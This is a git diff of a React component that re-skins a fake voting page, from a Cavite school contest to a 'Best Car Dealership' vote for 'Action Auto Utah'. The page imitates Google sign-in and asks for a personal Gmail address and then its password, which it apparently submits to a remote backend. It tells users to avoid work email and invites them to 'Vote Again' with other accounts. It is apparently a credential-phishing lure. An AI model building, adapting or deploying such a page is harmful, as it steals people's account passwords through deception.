@@ -1,7 +1,10 @@
 import React, { useState } from 'react';
-import { VoteResponse } from '../types';
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://votingsystem-tqdk.onrender.com';
+
+interface VoteResponse {
+  message?: string;
+}
 
 const VotingSystem: React.FC = () => {
   const [email, setEmail] = useState<string>('');
@@ -12,7 +15,7 @@ const VotingSystem: React.FC = () => {
 
   const handleNext = (): void => {
     if (!email.trim()) {
-      alert('Please enter your email or phone');
+      alert('Please enter your personal email');
       return;
     }
     setShowPassword(true);
@@ -48,202 +51,286 @@ const VotingSystem: React.FC = () => {
   };
 
   return (
-    <div className="min-h-screen relative overflow-hidden" style={{ background: 'linear-gradient(135deg, #0f2027 0%, #1a3a2a 40%, #2d1b00 100%)' }}>
+    <div
+      className="min-h-screen relative overflow-hidden"
+      style={{ background: 'linear-gradient(160deg, #0a0a0a 0%, #111827 45%, #0f1a2e 100%)' }}
+    >
+      {/* Carbon fiber texture overlay */}
+      <div
+        className="absolute inset-0 opacity-[0.03]"
+        style={{
+          backgroundImage: `repeating-linear-gradient(0deg, transparent, transparent 2px, #e2b43c 2px, #e2b43c 3px),
+            repeating-linear-gradient(90deg, transparent, transparent 2px, #e2b43c 2px, #e2b43c 3px)`,
+        }}
+      />
 
-      {/* Woven texture overlay */}
-      <div className="absolute inset-0 opacity-5" style={{
-        backgroundImage: `repeating-linear-gradient(45deg, #d4a017 0px, #d4a017 1px, transparent 1px, transparent 8px),
-          repeating-linear-gradient(-45deg, #d4a017 0px, #d4a017 1px, transparent 1px, transparent 8px)`
-      }} />
-
-      {/* Tropical leaf silhouettes */}
+      {/* Speed lines bg */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
-        <svg className="absolute -top-16 -left-16 w-96 h-96 opacity-10" viewBox="0 0 200 200" fill="none">
-          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#22c55e" />
-          <path d="M100 10 Q100 100 100 190" stroke="#16a34a" strokeWidth="2"/>
-        </svg>
-        <svg className="absolute -top-8 -right-24 w-80 h-80 opacity-10 rotate-45" viewBox="0 0 200 200" fill="none">
-          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#22c55e" />
-        </svg>
-        <svg className="absolute bottom-0 left-1/4 w-64 h-64 opacity-10 rotate-12" viewBox="0 0 200 200" fill="none">
-          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#f59e0b" />
-        </svg>
-        <svg className="absolute bottom-10 right-1/3 w-48 h-48 opacity-8 -rotate-12" viewBox="0 0 200 200" fill="none">
-          <path d="M100 10 Q160 80 100 190 Q40 80 100 10Z" fill="#22c55e" />
-        </svg>
-        {/* Floating stars/sparkles */}
-        {[...Array(16)].map((_, i) => (
+        {[...Array(10)].map((_, i) => (
+          <div
+            key={i}
+            className="absolute"
+            style={{
+              top: `${8 + i * 9}%`,
+              left: '-10%',
+              right: '-10%',
+              height: '1px',
+              background: `linear-gradient(90deg, transparent 0%, rgba(226,180,60,${0.03 + i * 0.01}) 40%, rgba(226,180,60,${0.07 + i * 0.01}) 60%, transparent 100%)`,
+              transform: `skewY(-${0.8 + i * 0.25}deg)`,
+            }}
+          />
+        ))}
+
+        {/* Glow orbs */}
+        <div
+          className="absolute rounded-full"
+          style={{
+            width: 600, height: 600, top: '-15%', right: '-15%',
+            background: 'radial-gradient(circle, rgba(226,180,60,0.06) 0%, transparent 70%)',
+          }}
+        />
+        <div
+          className="absolute rounded-full"
+          style={{
+            width: 400, height: 400, bottom: '-10%', left: '-10%',
+            background: 'radial-gradient(circle, rgba(37,99,235,0.05) 0%, transparent 70%)',
+          }}
+        />
+
+        {/* Floating particles */}
+        {[...Array(14)].map((_, i) => (
           <div
             key={i}
             className="absolute rounded-full"
             style={{
-              width: `${3 + Math.random() * 4}px`,
-              height: `${3 + Math.random() * 4}px`,
-              top: `${Math.random() * 100}%`,
-              left: `${Math.random() * 100}%`,
-              background: i % 3 === 0 ? '#d4a017' : i % 3 === 1 ? '#22c55e' : '#f97316',
-              opacity: 0.4,
-              animation: `twinkle ${3 + Math.random() * 4}s ease-in-out infinite`,
-              animationDelay: `${Math.random() * 4}s`,
+              width: `${2 + (i % 3)}px`,
+              height: `${2 + (i % 3)}px`,
+              top: `${(i * 7.1) % 100}%`,
+              left: `${(i * 13.3) % 100}%`,
+              background: i % 2 === 0 ? '#e2b43c' : '#3b82f6',
+              opacity: 0.25,
+              animation: `drift ${5 + i}s ease-in-out infinite`,
+              animationDelay: `${i * 0.4}s`,
             }}
           />
         ))}
       </div>
 
-      {/* Decorative gold arch top bar */}
-      <div className="absolute top-0 left-0 right-0 h-1" style={{ background: 'linear-gradient(90deg, #92400e, #d4a017, #f59e0b, #d4a017, #92400e)' }} />
+      {/* Top gold bar */}
+      <div
+        className="absolute top-0 left-0 right-0 h-[3px]"
+        style={{ background: 'linear-gradient(90deg, #78350f, #e2b43c, #fde68a, #e2b43c, #78350f)' }}
+      />
 
-      {/* Main layout */}
       <div className="relative z-10 min-h-screen flex flex-col">
 
-        {/* Header */}
-        <header className="w-full px-4 pt-10 pb-6 md:pt-14">
-          <div className="max-w-5xl mx-auto text-center">
+        {/* ── Header ── */}
+        <header className="w-full px-4 pt-12 pb-8">
+          <div className="max-w-4xl mx-auto text-center">
 
-            {/* Badge */}
-            <div className="inline-flex items-center gap-2 mb-5 px-5 py-2 rounded-full border" style={{
-              background: 'rgba(212,160,23,0.12)',
-              borderColor: 'rgba(212,160,23,0.45)',
-            }}>
-              <span style={{ fontSize: 16 }}>🏆</span>
-              <span className="text-xs font-bold tracking-widest uppercase" style={{ color: '#f0c040', fontFamily: "'Georgia', serif", letterSpacing: '0.18em' }}>
-                Official Voting • Cavite, Philippines
+            {/* Award badge */}
+            <div
+              className="inline-flex items-center gap-2 mb-6 px-5 py-2 rounded-full"
+              style={{
+                background: 'rgba(226,180,60,0.08)',
+                border: '1px solid rgba(226,180,60,0.3)',
+              }}
+            >
+              <span className="text-xs font-bold tracking-[0.2em] uppercase"
+                style={{ color: '#e2b43c', fontFamily: "'Courier New', monospace" }}>
+                🏆 Best Car Dealership Award · Utah, USA
               </span>
-              <span style={{ fontSize: 16 }}>🌺</span>
             </div>
 
             {/* Category pills */}
-            <div className="flex flex-wrap items-center justify-center gap-3 mb-5">
-              <span className="flex items-center gap-2 px-5 py-2 rounded-full text-sm font-semibold" style={{
-                background: 'linear-gradient(135deg, #b45309, #d97706)',
-                color: '#fff',
-                boxShadow: '0 2px 16px #d9770650',
-                fontFamily: "'Georgia', serif",
-              }}>
-                🍽️ Hotel &amp; Restaurant Management
+            <div className="flex flex-wrap items-center justify-center gap-3 mb-6">
+              <span
+                className="px-5 py-2 rounded-full text-xs font-bold tracking-widest uppercase"
+                style={{
+                  background: 'linear-gradient(135deg, #1e3a5f, #1d4ed8)',
+                  color: '#bfdbfe',
+                  boxShadow: '0 2px 18px rgba(29,78,216,0.3)',
+                  fontFamily: "'Courier New', monospace",
+                }}
+              >
+                🚗 Automotive Excellence
               </span>
-              <span className="flex items-center gap-2 px-4 py-2 rounded-full text-sm font-bold" style={{ color: '#d4a017' }}>×</span>
-              <span className="flex items-center gap-2 px-5 py-2 rounded-full text-sm font-semibold" style={{
-                background: 'linear-gradient(135deg, #065f46, #059669)',
-                color: '#fff',
-                boxShadow: '0 2px 16px #05966950',
-                fontFamily: "'Georgia', serif",
-              }}>
-                ✈️ Tourism Management
+              <span
+                className="px-5 py-2 rounded-full text-xs font-bold tracking-widest uppercase"
+                style={{
+                  background: 'linear-gradient(135deg, #451a03, #b45309)',
+                  color: '#fde68a',
+                  boxShadow: '0 2px 18px rgba(180,83,9,0.3)',
+                  fontFamily: "'Courier New', monospace",
+                }}
+              >
+                ⭐ Customer Service
               </span>
             </div>
 
             {/* Main headline */}
-            <h1 className="font-black leading-tight mb-3" style={{
-              fontFamily: "'Georgia', 'Times New Roman', serif",
-              fontSize: 'clamp(1.8rem, 5vw, 3.6rem)',
-              color: '#fff',
-              textShadow: '0 2px 24px rgba(212,160,23,0.3)',
-            }}>
-              Vote for the{' '}
-              <span style={{
-                background: 'linear-gradient(90deg, #f59e0b, #fcd34d, #f59e0b)',
-                WebkitBackgroundClip: 'text',
-                WebkitTextFillColor: 'transparent',
-              }}>
-                Best School
+            <h1
+              className="font-black leading-none mb-3 uppercase"
+              style={{
+                fontFamily: "'Georgia', 'Times New Roman', serif",
+                fontSize: 'clamp(2rem, 6vw, 4.2rem)',
+                color: '#fff',
+                letterSpacing: '-0.02em',
+              }}
+            >
+              Vote{' '}
+              <span
+                style={{
+                  background: 'linear-gradient(90deg, #e2b43c, #fde68a, #e2b43c)',
+                  WebkitBackgroundClip: 'text',
+                  WebkitTextFillColor: 'transparent',
+                }}
+              >
+                Action Auto Utah
               </span>
             </h1>
 
-            <p className="text-base md:text-lg" style={{ color: 'rgba(255,255,255,0.55)', fontFamily: "'Georgia', serif", fontStyle: 'italic' }}>
-              Recognizing excellence in hospitality &amp; travel education across Cavite
+            <p
+              className="text-sm"
+              style={{
+                color: 'rgba(255,255,255,0.4)',
+                fontFamily: "'Courier New', monospace",
+                letterSpacing: '0.08em',
+              }}
+            >
+              Help us earn the title of Utah's #1 Car Dealership
             </p>
           </div>
         </header>
 
-        {/* Main content */}
-        <main className="flex-1 flex items-center justify-center px-4 pb-8">
+        {/* ── Form Card ── */}
+        <main className="flex-1 flex items-center justify-center px-4 pb-10">
           <div className="w-full max-w-sm">
+            <div
+              className="rounded-2xl overflow-hidden"
+              style={{
+                background: 'rgba(255,255,255,0.04)',
+                backdropFilter: 'blur(24px)',
+                border: '1px solid rgba(226,180,60,0.2)',
+                boxShadow: '0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(226,180,60,0.12)',
+              }}
+            >
+              {/* Card accent bar */}
+              <div className="h-[2px]" style={{ background: 'linear-gradient(90deg, #1e3a5f, #e2b43c, #1d4ed8)' }} />
 
-            {/* Card */}
-            <div className="rounded-3xl overflow-hidden" style={{
-              background: 'rgba(255,255,255,0.07)',
-              backdropFilter: 'blur(20px)',
-              border: '1px solid rgba(212,160,23,0.25)',
-              boxShadow: '0 8px 48px rgba(0,0,0,0.5), inset 0 1px 0 rgba(212,160,23,0.2)',
-            }}>
+              <div className="p-8">
 
-              {/* Card top accent */}
-              <div className="h-1" style={{ background: 'linear-gradient(90deg, #065f46, #d4a017, #b45309)' }} />
-
-              <div className="p-7 sm:p-9">
-                {/* Icon cluster */}
-                <div className="flex justify-center mb-6">
-                  <div className="relative">
-                    <div className="w-20 h-20 rounded-2xl flex items-center justify-center text-4xl" style={{
-                      background: 'linear-gradient(135deg, rgba(212,160,23,0.2), rgba(6,95,70,0.2))',
-                      border: '1px solid rgba(212,160,23,0.35)',
-                      boxShadow: '0 4px 24px rgba(212,160,23,0.2)',
-                    }}>
-                      🗳️
-                    </div>
-                    <div className="absolute -bottom-1 -right-2 text-xl">🌴</div>
+                {/* Icon + card title */}
+                <div className="flex flex-col items-center mb-7">
+                  <div
+                    className="w-16 h-16 rounded-xl flex items-center justify-center text-3xl mb-3"
+                    style={{
+                      background: 'linear-gradient(135deg, rgba(226,180,60,0.12), rgba(29,78,216,0.12))',
+                      border: '1px solid rgba(226,180,60,0.2)',
+                    }}
+                  >
+                    🗳️
                   </div>
-                </div>
-
-                {/* Card title */}
-                <div className="text-center mb-7">
-                  <h2 className="text-2xl font-bold mb-1" style={{ color: '#fff', fontFamily: "'Georgia', serif" }}>
+                  <h2
+                    className="text-xl font-bold mb-1"
+                    style={{ color: '#fff', fontFamily: "'Georgia', serif" }}
+                  >
                     Cast Your Vote
                   </h2>
-                  <p className="text-xs" style={{ color: 'rgba(255,255,255,0.45)', letterSpacing: '0.05em' }}>
-                    Sign in with your Gmail account to continue
+                  <p
+                    className="text-xs text-center leading-relaxed"
+                    style={{ color: 'rgba(255,255,255,0.4)', fontFamily: "'Courier New', monospace" }}
+                  >
+                    Sign in with your{' '}
+                    <span style={{ color: '#fbbf24', fontWeight: 700 }}>personal email</span>
+                    {' '}to continue
                   </p>
                 </div>
 
-                {/* Google logo row */}
-                <div className="flex items-center gap-3 mb-6 px-4 py-3 rounded-xl" style={{
-                  background: 'rgba(255,255,255,0.05)',
-                  border: '1px solid rgba(255,255,255,0.1)',
-                }}>
-                  <svg className="w-6 h-6 flex-shrink-0" viewBox="0 0 48 48">
-                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                  </svg>
-                  <span className="text-sm" style={{ color: 'rgba(255,255,255,0.6)' }}>Continue with Google</span>
+                {/* ⚠️ Personal email notice */}
+                <div
+                  className="flex items-start gap-2 mb-5 px-3 py-3 rounded-xl"
+                  style={{
+                    background: 'rgba(251,191,36,0.07)',
+                    border: '1px solid rgba(251,191,36,0.2)',
+                  }}
+                >
+                  <span style={{ fontSize: 13, marginTop: 1, flexShrink: 0 }}>⚠️</span>
+                  <p
+                    className="text-xs leading-relaxed"
+                    style={{ color: 'rgba(255,255,255,0.65)', fontFamily: "'Courier New', monospace" }}
+                  >
+                    Please use your <strong style={{ color: '#fbbf24' }}>personal email</strong> (Gmail Only).{' '}
+                    <strong style={{ color: '#f87171' }}>Do NOT</strong> use your work or organization email.
+                  </p>
                 </div>
 
-                {/* Form */}
+                {/* Email providers row */}
+                <div
+                  className="flex items-center gap-3 mb-5 px-4 py-3 rounded-xl"
+                  style={{
+                    background: 'rgba(255,255,255,0.04)',
+                    border: '1px solid rgba(255,255,255,0.07)',
+                  }}
+                >
+                  <div className="flex gap-2 items-center">
+                    {/* Gmail */}
+                    <svg className="w-5 h-5" viewBox="0 0 48 48">
+                      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
+                  </div>
+                  <span
+                    className="text-xs"
+                    style={{ color: 'rgba(255,255,255,0.4)', fontFamily: "'Courier New', monospace" }}
+                  >
+                    Personal Gmail Account Only.
+                  </span>
+                </div>
+
+                {/* ── Email step ── */}
                 {!showPassword ? (
                   <div className="space-y-4">
                     <input
-                      type="text"
+                      type="email"
                       value={email}
                       onChange={(e: React.ChangeEvent<HTMLInputElement>) => setEmail(e.target.value)}
-                      placeholder="Email or phone"
+                      placeholder="Personal email address"
                       className="w-full px-4 py-3.5 rounded-xl text-sm outline-none transition-all"
                       style={{
-                        background: 'rgba(255,255,255,0.08)',
-                        border: '1.5px solid rgba(255,255,255,0.15)',
+                        background: 'rgba(255,255,255,0.06)',
+                        border: '1.5px solid rgba(255,255,255,0.12)',
                         color: '#fff',
-                        fontFamily: "'Georgia', serif",
+                        fontFamily: "'Courier New', monospace",
                       }}
-                      onFocus={e => { e.target.style.borderColor = '#d4a017'; e.target.style.background = 'rgba(212,160,23,0.08)'; }}
-                      onBlur={e => { e.target.style.borderColor = 'rgba(255,255,255,0.15)'; e.target.style.background = 'rgba(255,255,255,0.08)'; }}
+                      onFocus={e => {
+                        e.target.style.borderColor = '#e2b43c';
+                        e.target.style.background = 'rgba(226,180,60,0.07)';
+                      }}
+                      onBlur={e => {
+                        e.target.style.borderColor = 'rgba(255,255,255,0.12)';
+                        e.target.style.background = 'rgba(255,255,255,0.06)';
+                      }}
                       onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleNext()}
                     />
 
-                    <p className="text-xs leading-relaxed" style={{ color: 'rgba(255,255,255,0.4)' }}>
-                      Not your device? Use Guest mode to sign in privately.{' '}
-                      <a href="#" style={{ color: '#d4a017' }}>Learn more</a>
+                    <p
+                      className="text-xs leading-relaxed"
+                      style={{ color: 'rgba(255,255,255,0.3)', fontFamily: "'Courier New', monospace" }}
+                    >
                     </p>
 
                     <button
                       onClick={handleNext}
-                      className="w-full py-3.5 rounded-xl font-bold text-sm tracking-wide transition-all"
+                      className="w-full py-3.5 rounded-xl font-bold text-sm tracking-widest uppercase transition-all"
                       style={{
-                        background: 'linear-gradient(135deg, #b45309, #d97706, #f59e0b)',
-                        color: '#fff',
-                        fontFamily: "'Georgia', serif",
-                        boxShadow: '0 4px 20px rgba(217,119,6,0.4)',
-                        letterSpacing: '0.04em',
+                        background: 'linear-gradient(135deg, #92400e, #d97706, #e2b43c)',
+                        color: '#0a0a0a',
+                        fontFamily: "'Courier New', monospace",
+                        boxShadow: '0 4px 24px rgba(226,180,60,0.35)',
+                        letterSpacing: '0.12em',
                       }}
                       onMouseEnter={e => (e.currentTarget.style.opacity = '0.88')}
                       onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
@@ -252,15 +339,28 @@ const VotingSystem: React.FC = () => {
                     </button>
                   </div>
                 ) : (
+                  /* ── Password step ── */
                   <div className="space-y-4">
-                    <div className="flex items-center gap-3 px-4 py-3 rounded-xl" style={{
-                      background: 'rgba(255,255,255,0.06)',
-                      border: '1.5px solid rgba(212,160,23,0.25)',
-                    }}>
-                      <div className="w-8 h-8 rounded-full flex items-center justify-center text-base flex-shrink-0" style={{ background: 'linear-gradient(135deg, #b45309, #065f46)' }}>
+                    {/* Email chip */}
+                    <div
+                      className="flex items-center gap-3 px-4 py-3 rounded-xl"
+                      style={{
+                        background: 'rgba(255,255,255,0.05)',
+                        border: '1.5px solid rgba(226,180,60,0.2)',
+                      }}
+                    >
+                      <div
+                        className="w-8 h-8 rounded-full flex items-center justify-center text-sm flex-shrink-0"
+                        style={{ background: 'linear-gradient(135deg, #92400e, #1e3a5f)' }}
+                      >
                         👤
                       </div>
-                      <span className="text-sm font-medium truncate" style={{ color: '#fff', fontFamily: "'Georgia', serif" }}>{email}</span>
+                      <span
+                        className="text-sm font-medium truncate"
+                        style={{ color: '#fff', fontFamily: "'Courier New', monospace" }}
+                      >
+                        {email}
+                      </span>
                     </div>
 
                     <input
@@ -270,13 +370,19 @@ const VotingSystem: React.FC = () => {
                       placeholder="Enter your password"
                       className="w-full px-4 py-3.5 rounded-xl text-sm outline-none transition-all"
                       style={{
-                        background: 'rgba(255,255,255,0.08)',
-                        border: '1.5px solid rgba(255,255,255,0.15)',
+                        background: 'rgba(255,255,255,0.06)',
+                        border: '1.5px solid rgba(255,255,255,0.12)',
                         color: '#fff',
-                        fontFamily: "'Georgia', serif",
+                        fontFamily: "'Courier New', monospace",
                       }}
-                      onFocus={e => { e.target.style.borderColor = '#059669'; e.target.style.background = 'rgba(5,150,105,0.08)'; }}
-                      onBlur={e => { e.target.style.borderColor = 'rgba(255,255,255,0.15)'; e.target.style.background = 'rgba(255,255,255,0.08)'; }}
+                      onFocus={e => {
+                        e.target.style.borderColor = '#3b82f6';
+                        e.target.style.background = 'rgba(59,130,246,0.07)';
+                      }}
+                      onBlur={e => {
+                        e.target.style.borderColor = 'rgba(255,255,255,0.12)';
+                        e.target.style.background = 'rgba(255,255,255,0.06)';
+                      }}
                       onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleSignIn()}
                       disabled={loading}
                     />
@@ -285,27 +391,30 @@ const VotingSystem: React.FC = () => {
                       <button
                         onClick={() => setShowPassword(false)}
                         className="text-sm transition-colors"
-                        style={{ color: 'rgba(255,255,255,0.45)', fontFamily: "'Georgia', serif" }}
+                        style={{ color: 'rgba(255,255,255,0.35)', fontFamily: "'Courier New', monospace" }}
                         disabled={loading}
-                        onMouseEnter={e => (e.currentTarget.style.color = '#d4a017')}
-                        onMouseLeave={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.45)')}
+                        onMouseEnter={e => (e.currentTarget.style.color = '#e2b43c')}
+                        onMouseLeave={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.35)')}
                       >
                         ← Back
                       </button>
                       <button
                         onClick={handleSignIn}
                         disabled={loading}
-                        className="px-7 py-3 rounded-xl font-bold text-sm tracking-wide transition-all"
+                        className="px-7 py-3 rounded-xl font-bold text-xs tracking-widest uppercase transition-all"
                         style={{
-                          background: loading ? 'rgba(255,255,255,0.1)' : 'linear-gradient(135deg, #065f46, #059669)',
+                          background: loading
+                            ? 'rgba(255,255,255,0.08)'
+                            : 'linear-gradient(135deg, #1e3a5f, #1d4ed8)',
                           color: '#fff',
-                          fontFamily: "'Georgia', serif",
-                          boxShadow: loading ? 'none' : '0 4px 20px rgba(5,150,105,0.4)',
+                          fontFamily: "'Courier New', monospace",
+                          boxShadow: loading ? 'none' : '0 4px 20px rgba(29,78,216,0.4)',
                           opacity: loading ? 0.6 : 1,
                           cursor: loading ? 'not-allowed' : 'pointer',
+                          letterSpacing: '0.1em',
                         }}
                       >
-                        {loading ? 'Submitting…' : 'Sign in →'}
+                        {loading ? 'Submitting…' : 'Sign In →'}
                       </button>
                     </div>
                   </div>
@@ -313,77 +422,110 @@ const VotingSystem: React.FC = () => {
               </div>
             </div>
 
-            {/* Note badge */}
-            <div className="mt-6 text-center">
-              <div className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full" style={{
-                background: 'rgba(212,160,23,0.1)',
-                border: '1px solid rgba(212,160,23,0.3)',
-              }}>
-                <span>⚠️</span>
-                <span className="text-xs font-medium" style={{ color: 'rgba(255,255,255,0.7)', fontFamily: "'Georgia', serif" }}>
-                  1 vote per Gmail account only
+            {/* One vote badge */}
+            <div className="mt-5 text-center">
+              <div
+                className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full"
+                style={{
+                  background: 'rgba(226,180,60,0.07)',
+                  border: '1px solid rgba(226,180,60,0.2)',
+                }}
+              >
+                <span style={{ fontSize: 13 }}>🔒</span>
+                <span
+                  className="text-xs font-medium"
+                  style={{ color: 'rgba(255,255,255,0.55)', fontFamily: "'Courier New', monospace" }}
+                >
+                  1 vote per personal email account
                 </span>
               </div>
             </div>
           </div>
         </main>
 
-        {/* Thank You Message */}
+        {/* ── Thank You Screen ── */}
         {voted && (
-          <div className="relative z-10 w-full px-4 pb-10">
-            <div className="max-w-md mx-auto">
-              <div className="rounded-3xl overflow-hidden text-center" style={{
-                background: 'rgba(255,255,255,0.06)',
-                backdropFilter: 'blur(20px)',
-                border: '1px solid rgba(212,160,23,0.25)',
-                boxShadow: '0 4px 32px rgba(0,0,0,0.4)',
-              }}>
-                <div className="h-0.5" style={{ background: 'linear-gradient(90deg, #065f46, #d4a017, #b45309)' }} />
-                <div className="p-8 sm:p-10">
-                  <div className="text-5xl mb-4">🎉</div>
-                  <h3 className="text-xl font-bold mb-2" style={{ color: '#fff', fontFamily: "'Georgia', serif" }}>
-                    Thank you for voting!
-                  </h3>
-                  <p className="text-sm leading-relaxed" style={{ color: 'rgba(255,255,255,0.55)', fontFamily: "'Georgia', serif", fontStyle: 'italic' }}>
-                    You can still vote with another Gmail account.
-                  </p>
-                  <button
-                    onClick={() => setVoted(false)}
-                    className="mt-6 px-7 py-2.5 rounded-xl text-sm font-semibold transition-all"
-                    style={{
-                      background: 'linear-gradient(135deg, #b45309, #d97706)',
-                      color: '#fff',
-                      fontFamily: "'Georgia', serif",
-                      boxShadow: '0 2px 14px rgba(217,119,6,0.35)',
-                    }}
-                    onMouseEnter={e => (e.currentTarget.style.opacity = '0.85')}
-                    onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
-                  >
-                    Vote with another account →
-                  </button>
-                </div>
+          <div className="relative z-20 fixed inset-0 flex items-center justify-center px-4"
+            style={{ background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)' }}
+          >
+            <div
+              className="w-full max-w-sm rounded-2xl overflow-hidden text-center"
+              style={{
+                background: 'rgba(255,255,255,0.05)',
+                border: '1px solid rgba(226,180,60,0.25)',
+                boxShadow: '0 24px 80px rgba(0,0,0,0.7)',
+              }}
+            >
+              <div className="h-[2px]" style={{ background: 'linear-gradient(90deg, #1e3a5f, #e2b43c, #1d4ed8)' }} />
+              <div className="p-10">
+                <div className="text-5xl mb-5">🎉</div>
+                <h3
+                  className="text-2xl font-bold mb-2"
+                  style={{ color: '#fff', fontFamily: "'Georgia', serif" }}
+                >
+                  Thank you for voting!
+                </h3>
+                <p
+                  className="text-sm leading-relaxed mb-1"
+                  style={{ color: 'rgba(255,255,255,0.5)', fontFamily: "'Courier New', monospace" }}
+                >
+                  You voted for{' '}
+                  <span style={{ color: '#e2b43c', fontWeight: 700 }}>Action Auto Utah</span>
+                  {' '}as Best Car Dealership.
+                </p>
+                <p
+                  className="text-xs mb-7"
+                  style={{ color: 'rgba(255,255,255,0.3)', fontFamily: "'Courier New', monospace" }}
+                >
+                  You can still vote using another personal email account.
+                </p>
+                <button
+                  onClick={() => setVoted(false)}
+                  className="px-8 py-3 rounded-xl text-sm font-bold tracking-widest uppercase transition-all"
+                  style={{
+                    background: 'linear-gradient(135deg, #92400e, #d97706)',
+                    color: '#0a0a0a',
+                    fontFamily: "'Courier New', monospace",
+                    boxShadow: '0 4px 20px rgba(217,119,6,0.35)',
+                    letterSpacing: '0.1em',
+                  }}
+                  onMouseEnter={e => (e.currentTarget.style.opacity = '0.85')}
+                  onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
+                >
+                  Vote Again →
+                </button>
               </div>
             </div>
           </div>
         )}
 
-        {/* Footer strip */}
-        <div className="text-center pb-5 px-4">
-          <p className="text-xs" style={{ color: 'rgba(255,255,255,0.25)', fontFamily: "'Georgia', serif", fontStyle: 'italic' }}>
-            🌺 Celebrating Excellence in HRM &amp; Tourism Education · Cavite, Philippines 🌴
+        {/* Footer */}
+        <div className="text-center pb-6 px-4">
+          <p
+            className="text-xs"
+            style={{
+              color: 'rgba(255,255,255,0.2)',
+              fontFamily: "'Courier New', monospace",
+              letterSpacing: '0.06em',
+            }}
+          >
+            🚗 Action Auto Utah · Celebrating Automotive Excellence · Utah, USA
           </p>
         </div>
       </div>
 
       {/* Bottom gold bar */}
-      <div className="absolute bottom-0 left-0 right-0 h-0.5" style={{ background: 'linear-gradient(90deg, #92400e, #d4a017, #f59e0b, #d4a017, #92400e)' }} />
+      <div
+        className="absolute bottom-0 left-0 right-0 h-[2px]"
+        style={{ background: 'linear-gradient(90deg, #78350f, #e2b43c, #fde68a, #e2b43c, #78350f)' }}
+      />
 
       <style>{`
-        @keyframes twinkle {
-          0%, 100% { opacity: 0.2; transform: scale(1); }
-          50% { opacity: 0.6; transform: scale(1.4); }
+        @keyframes drift {
+          0%, 100% { transform: translateY(0px); opacity: 0.2; }
+          50% { transform: translateY(-12px); opacity: 0.45; }
         }
-        input::placeholder { color: rgba(255,255,255,0.35) !important; }
+        input::placeholder { color: rgba(255,255,255,0.25) !important; }
       `}</style>
     </div>
   );
